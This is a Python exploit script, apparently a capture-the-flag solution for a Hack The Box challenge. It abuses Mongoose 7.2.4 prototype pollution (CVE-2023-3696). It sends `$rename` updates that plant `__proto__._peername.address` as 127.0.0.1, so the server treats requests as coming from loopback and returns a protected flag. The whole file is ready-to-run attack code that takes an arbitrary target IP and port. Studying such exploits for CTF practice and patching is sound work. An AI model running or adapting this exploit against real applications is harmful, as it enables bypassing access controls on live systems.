#!/usr/bin/env python3
"""Secure Notes (HTB) - prototype pollution of Node's socket internals.

Mongoose 7.2.4 hydrates a document field named `__proto__` by recursing into
Object.prototype (CVE-2023-3696, fixed in 7.3.3). The /update handler passes
req.body straight into findByIdAndUpdate, so `$rename` can move the note's
`content` under `__proto__._peername.address`. Every later document read then
sets Object.prototype._peername, and Node's Socket#remoteAddress getter
returns `this._peername.address`. The /flag route trusts loopback addresses
only, so the next request is treated as coming from 127.0.0.1.

Usage:
    python3 solve.py <target_ip> <target_port>
"""
import json
import sys
import urllib.error
import urllib.request


def call(base, path, payload=None):
    data = json.dumps(payload).encode() if payload is not None else None
    headers = {"Content-Type": "application/json"} if data is not None else {}
    req = urllib.request.Request(base + path, data=data, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def create(base, content):
    status, body = call(base, "/create", {"title": "x", "content": content})
    if status != 200:
        raise RuntimeError(f"create failed: {status} {body[:200]!r}")
    return json.loads(body)["_id"]


def rename(base, note_id, target):
    status, body = call(
        base, "/update", {"noteId": note_id, "$rename": {"content": target}}
    )
    return status, body


def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <target_ip> <target_port>", file=sys.stderr)
        return 2
    base = f"http://{sys.argv[1]}:{sys.argv[2]}"

    # A previous run (or another player on a shared process) may have left
    # Object.prototype._peername as a string, which makes the nested write
    # throw. Reset the slot to a falsy value first; it is a no-op when clean.
    status, body = rename(base, create(base, ""), "__proto__._peername")
    if status != 200:
        print(f"[-] reset failed: {status} {body[:200]!r}", file=sys.stderr)
        return 1

    # The document read performed by /update itself plants the forged peer.
    status, body = rename(
        base, create(base, "127.0.0.1"), "__proto__._peername.address"
    )
    if status != 200:
        print(f"[-] pollution failed: {status} {body[:200]!r}", file=sys.stderr)
        return 1

    status, body = call(base, "/flag")
    if status != 200:
        print(f"[-] /flag returned {status}: {body[:200]!r}", file=sys.stderr)
        return 1
    print(body.decode().strip())
    return 0


if __name__ == "__main__":
    sys.exit(main())
